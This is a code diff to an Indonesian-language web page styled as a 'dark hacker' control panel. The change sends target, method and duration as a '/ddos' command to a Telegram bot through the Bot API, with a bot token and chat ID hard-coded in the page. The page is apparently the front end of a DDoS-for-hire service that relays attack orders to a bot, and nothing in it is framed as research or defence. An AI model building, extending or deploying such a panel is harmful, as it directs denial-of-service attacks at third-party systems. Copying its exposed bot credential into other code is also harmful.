@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id" >
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
   <title>Kontrol Panel - Dark Hacker Style</title>
@@ -132,14 +132,29 @@
 
       document.getElementById('result').textContent = 'Mengirim perintah...';
 
+      // Your Telegram bot token and chat ID
+      const botToken = '7900349632:AAEk9YXWq4YKdRJN48hTwBOntoy02LKnFU8';
+      const chatId = '8050058475';
+
+      const message = `/ddos ${method} ${target} ${duration}`;
+
       try {
-        const response = await fetch('/run_command', {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({target, duration, method})
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
         });
+
         const data = await response.json();
-        document.getElementById('result').textContent = JSON.stringify(data, null, 2);
+
+        if (data.ok) {
+          document.getElementById('result').textContent = 'Perintah berhasil dikirim ke bot Telegram!';
+        } else {
+          document.getElementById('result').textContent = 'Gagal mengirim perintah ke bot!';
+        }
       } catch (err) {
         document.getElementById('result').textContent = 'Error: ' + err.message;
       }
